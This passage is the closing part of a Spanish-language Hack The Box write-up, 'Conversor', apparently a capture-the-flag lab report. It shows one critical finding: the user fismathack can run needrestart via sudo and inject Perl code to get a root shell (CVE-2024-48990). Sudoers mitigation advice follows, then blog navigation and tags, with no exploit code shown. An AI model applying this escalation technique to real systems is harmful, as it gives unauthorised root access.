+          <td style="text-align: center"><span style="background-color: #cc0000; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Crítica 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">El usuario local <code>fismathack</code> con capacidad de ejecutar <code>needrestart</code>, con capacidad de inyectar código <code>perl</code>, obteniendo una <code>shell</code> como <code>root</code>.<br></td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <blockquote>
+<p>Para mitigar las capacidades de un atacante de poder escalar privilegios, se insta a:</p>
+<ul>
+<li>Remover permisos de ejecución como administrador al usuario <code>fismathack</code> para la ejecución de <code>needrestart</code> en el archivo <code>/etc/sudoers</code>.</li>
+<li>En caso de ser estrictamente necesario, restringir el parámetro <code>-c</code>, o bien, permitiendo rutas de configuración absolutas, protegidas contra escritura para el usuario <code>fismathack</code>.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+
+  </div><div class="border-top pt-4 mt-4">
+    <p class="f5 text-bold mb-2">Share</p>
+    <div class="d-flex flex-wrap" style="gap: 0.5rem;">
+      <a href="https://twitter.com/intent/tweet?text=WriteUp%3A&#43;Conversor&#43;%7C&#43;HTB&url=https%3A%2F%2Fmaxisfront.me%2Fes%2Fposts%2Fwriteup-conversor-htb%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"></path>
+        </svg>
+        X
+      </a>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmaxisfront.me%2Fes%2Fposts%2Fwriteup-conversor-htb%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"></path>
+        </svg>
+        Facebook
+      </a>
+      <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmaxisfront.me%2Fes%2Fposts%2Fwriteup-conversor-htb%2F&title=WriteUp%3A&#43;Conversor&#43;%7C&#43;HTB" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854zm4.943 12.248V6.169H2.542v7.225zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248S2.4 3.226 2.4 3.934c0 .694.521 1.248 1.327 1.248zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016l.016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225z"></path>
+        </svg>
+        LinkedIn
+      </a>
+      <a href="https://bsky.app/intent/compose?text=WriteUp%3A&#43;Conversor&#43;%7C&#43;HTB%20https%3A%2F%2Fmaxisfront.me%2Fes%2Fposts%2Fwriteup-conversor-htb%2F" target="_blank" rel="noopener noreferrer" class="btn btn-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" class="octicon mr-1" style="vertical-align: text-bottom;">
+          <path d="M3.468 1.948C5.303 3.325 7.276 6.118 8 7.616c.724-1.498 2.697-4.29 4.532-5.668C13.855.955 16 .186 16 2.632c0 .489-.28 4.105-.444 4.692-.572 2.04-2.653 2.561-4.504 2.246 3.236.551 4.06 2.375 2.281 4.2-3.376 3.464-4.852-.872-5.23-1.988-.07-.205-.103-.3-.103-.218 0-.081-.033.013-.103.218-.378 1.116-1.854 5.452-5.23 1.988-1.778-1.825-.955-3.649 2.28-4.2-1.85.315-3.93-.205-4.503-2.246C.28 6.737 0 3.12 0 2.632 0 .186 2.145.955 3.468 1.948"></path>
+        </svg>
+        Bluesky
+      </a>
+    </div>
+  </div><div class="border-top pt-4 mt-4">
+    <h2 class="f4 mb-3">Related Posts</h2>
+    <div class="d-flex flex-column flex-md-row"><div class="flex-1 mb-3 mb-md-0 mr-md-3">
+        <a href="/es/posts/writeup-dc-2-vulnhub/" class="Link--primary text-bold">WriteUp: DC-2 | VulnHub</a><p class="color-fg-muted f6 mb-0">
+          2026-03-25
+        </p></div><div class="flex-1 mb-3 mb-md-0 mr-md-3">
+        <a href="/es/posts/writeup-dc-1-vulnhub/" class="Link--primary text-bold">WriteUp: DC-1 | VulnHub</a><p class="color-fg-muted f6 mb-0">
+          2026-03-16
+        </p></div></div>
+  </div><nav class="border-top pt-4 mt-4">
+    <div class="d-flex flex-justify-between"><a href="/es/posts/writeup-dc-2-vulnhub/" class="Link--secondary">
+        &larr; WriteUp: DC-2 | VulnHub
+      </a></div>
+  </nav>
+</article>
+          </div>
+          <div class="Layout-sidebar"><aside><div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">Recent Posts</h3>
+  <ul class="list-style-none"><li class="mb-2">
+      <a href="/es/posts/writeup-conversor-htb/" class="Link--primary">WriteUp: Conversor | HTB</a><span class="color-fg-muted f6 d-block">
+        2026-05-24
+      </span></li><li class="mb-2">
+      <a href="/es/posts/writeup-dc-2-vulnhub/" class="Link--primary">WriteUp: DC-2 | VulnHub</a><span class="color-fg-muted f6 d-block">
+        2026-03-25
+      </span></li><li class="mb-2">
+      <a href="/es/posts/writeup-dc-1-vulnhub/" class="Link--primary">WriteUp: DC-1 | VulnHub</a><span class="color-fg-muted f6 d-block">
+        2026-03-16
+      </span></li></ul>
+</div><div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">Links</h3>
+  <div class="d-flex flex-wrap">
+    
+    <a href="https://github.com/MaxisFront" class="btn btn-sm mr-1 mb-1 tooltipped tooltipped-n" target="_blank" rel="noopener" aria-label="GitHub">
+      <svg class="octicon" viewBox="0 0 16 16" width="16" height="16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+    </a>
+
+    <a href="https://app.hackthebox.com/users/1716295" class="btn btn-sm mr-1 mb-1 tooltipped tooltipped-n" target="_blank" rel="noopener" aria-label="HackTheBox">
+      <svg class="octicon" viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="m22.5106 6.4566.0008-.0123a.888.888 0 0 0-.2717-.6384c-.0084-.0084-.018-.0155-.0267-.0235-.0186-.0166-.0371-.0333-.0572-.0484-.0193-.0147-.04-.0276-.0607-.0406-.0096-.006-.0182-.0131-.0281-.0188L12.4576.1266a.891.891 0 0 0-.9223.0043L1.933 5.6744c-.0107.0062-.0203.014-.0307.0205-.0073.0047-.015.008-.0223.0128-.007.0047-.013.0106-.02.0155a.8769.8769 0 0 0-.147.1333l-.0026.003a.8872.8872 0 0 0-.2218.5847l.0009.014c-.0002.0088-.0015.0176-.0015.0264v11.0708c0 .3277.1802.6288.469.7836l9.5986 5.5417c.0076.0044.0158.0075.0236.0117a.8754.8754 0 0 0 .166.0687c.0134.004.0266.0083.0401.0117a.8793.8793 0 0 0 .072.0142c.0117.0019.0232.0045.0349.006a.835.835 0 0 0 .2157 0c.0117-.0015.0232-.0041.0348-.006a.9.9 0 0 0 .072-.0142c.0135-.0034.0267-.0077.04-.0117a.895.895 0 0 0 .0646-.0217.9134.9134 0 0 0 .1015-.047c.0078-.0042.016-.0072.0236-.0117l9.5986-5.5417a.8888.8888 0 0 0 .469-.7836V6.4779c0-.0071-.0012-.0142-.0014-.0213zM5.2543 6.0822l6.5367-3.774a.4182.4182 0 0 1 .4182 0l6.5366 3.774a.4182.4182 0 0 1 0 .7243l-6.5367 3.774a.4182.4182 0 0 1-.4182 0l-6.5366-3.774a.4182.4182 0 0 1 0-.7243zm5.6134 14.3449a.4172.4172 0 0 1-.626.3613L3.718 17.0218a.4173.4173 0 0 1-.2086-.3613V9.1279a.4172.4172 0 0 1 .6258-.3613l6.524 3.7666a.4172.4172 0 0 1 .2086.3614v7.5325zm9.623-3.7666a.4173.4173 0 0 1-.2086.3613l-6.5239 3.7666a.4172.4172 0 0 1-.6259-.3613v-7.5325c0-.149.0796-.2868.2087-.3614l6.5239-3.7666a.4172.4172 0 0 1 .6258.3613v7.5326z"/></svg>
+    </a>
+
+    <a href="https://www.linkedin.com/in/brandon-s%C3%A1nchez-roblero-a64987282/" class="btn btn-sm mr-1 mb-1 tooltipped tooltipped-n" target="_blank" rel="noopener" aria-label="LinkedIn">
+      <svg class="octicon" viewBox="0 0 512 509.64" width="16" height="16" fill="currentColor"><path d="M204.97 197.54h64.69v33.16h.94c9.01-16.16 31.04-33.16 63.89-33.16 68.31 0 80.94 42.51 80.94 97.81v116.92h-67.46l-.01-104.13c0-23.81-.49-54.45-35.08-54.45-35.12 0-40.51 25.91-40.51 52.72v105.86h-67.4V197.54zm-38.23-65.09c0 19.36-15.72 35.08-35.08 35.08-19.37 0-35.09-15.72-35.09-35.08 0-19.37 15.72-35.08 35.09-35.08 19.36 0 35.08 15.71 35.08 35.08zm-70.17 65.09h70.17v214.73H96.57V197.54z"></path></svg>
+    </a>
+
+  </div>
+</div>
+
+
+<div class="color-bg-subtle rounded-2 p-3 mb-3">
+  <h3 class="h5 mb-2">
+    <a href="/es/tags/" class="Link--primary">Tags</a>
+  </h3>
+  <div class="sidebar-collapsible d-flex flex-wrap" style="gap: 0.5rem;"
+    data-max-height="150"
+    data-view-all="/es/tags/"
+    data-label-more="Show more"
+    data-label-less="Show less"
+    data-label-view-all="View all"><a href="/es/tags/caido/" class="topic-tag">
+      caido
+    </a><a href="/es/tags/cewl/" class="topic-tag">
+      cewl
+    </a><a href="/es/tags/cms/" class="topic-tag">
+      cms
+    </a><a href="/es/tags/cve-2018-7600/" class="topic-tag">
+      cve-2018-7600
+    </a><a href="/es/tags/cve-2024-48990/" class="topic-tag">
+      cve-2024-48990
+    </a><a href="/es/tags/drupal/" class="topic-tag">
+      drupal
+    </a><a href="/es/tags/gftobins/" class="topic-tag">
+      gftobins
+    </a><a href="/es/tags/git/" class="topic-tag">
+      git
+    </a><a href="/es/tags/gtfobins/" class="topic-tag">
+      gtfobins
+    </a><a href="/es/tags/linux/" class="topic-tag">
+      linux
+    </a><a href="/es/tags/path-traversal/" class="topic-tag">
+      path-traversal
+    </a><a href="/es/tags/suid/" class="topic-tag">
+      suid
+    </a><a href="/es/tags/web/" class="topic-tag">
+      web
+    </a><a href="/es/tags/wordpress/" class="topic-tag">
+      wordpress
+    </a></div>
+</div>
+<div class="sidebar-module-toc"> <div class="Box Box--condensed mb-3">
+      <div class="Box-header">
+        <h3 class="Box-title">ToC</h3>
+      </div>
+      <div class="Box-body toc-sidebar">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#escaneo-y-análisis-de-vulnerabilidades">Escaneo y Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#reconocimiento-de-puertos">Reconocimiento de Puertos</a></li>
+        <li><a href="#enumeración-de-puertos">Enumeración de Puertos</a></li>
+        <li><a href="#enumeración-web">Enumeración Web</a></li>
+      </ul>
+    </li>
+    <li><a href="#explotación">Explotación</a>
+      <ul>
+        <li><a href="#web">Web</a></li>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#cve-2024-48990">CVE-2024-48990</a></li>
+      </ul>
+    </li>
+    <li><a href="#impacto">Impacto</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#descubrimientos">Descubrimientos</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </div>
+    </div>
+</div>
+
+</aside></div>
+        </div></div>
+    </main><footer class="color-bg-subtle border-top py-6 mt-6">
+  <div class="container-xl px-3 px-md-4 px-lg-5">
+    <div class="d-flex flex-column flex-md-row flex-justify-between flex-items-center">
+      <div class="mb-3 mb-md-0">
+        <p class="color-fg-muted mb-0">
+          &copy; 2026 MaxisFront.</p>
+      </div><nav class="d-flex flex-wrap" aria-label="Footer navigation"><a href="/privacy/" class="Link--secondary px-2">Privacy</a></nav><div class="d-flex flex-items-center"><a href="https://github.com/MaxisFront" class="Link--secondary px-2" aria-label="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="20" height="20" class="octicon">
+            <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+          </svg>
+        </a><a href="https://x.com/MaxisFront" class="Link--secondary px-2" aria-label="X">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="20" height="20" class="octicon">
+            <path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"></path>
+          </svg>
+        </a></div></div>
+
+    <p class="color-fg-muted f6 mt-4 text-center">
+      Powered by
+      <a href="https://github.com/ngs/hugo-primer-blog" class="Link--secondary">Hugo Primer Blog</a>
+    </p>
+  </div>
+</footer>
+</div><script src="/js/theme-switcher.min.7378bbae7a4bc4b974611d68fe84197c86faf4bb09e4744c2789f4bd36159a0b.js" integrity="sha256-c3i7rnpLxLl0YR1o/oQZfIb69LsJ5HRMJ4n0vTYVmgs="></script><script src="/js/sidebar.min.8d897965d82e39784b4da02d345c06f44ecdff6252fcf44c20eeb421f1027114.js" integrity="sha256-jYl5ZdguOXhLTaAtNFwG9E7N/2JS/PRMIO60IfECcRQ="></script>
+</body>
+</html>
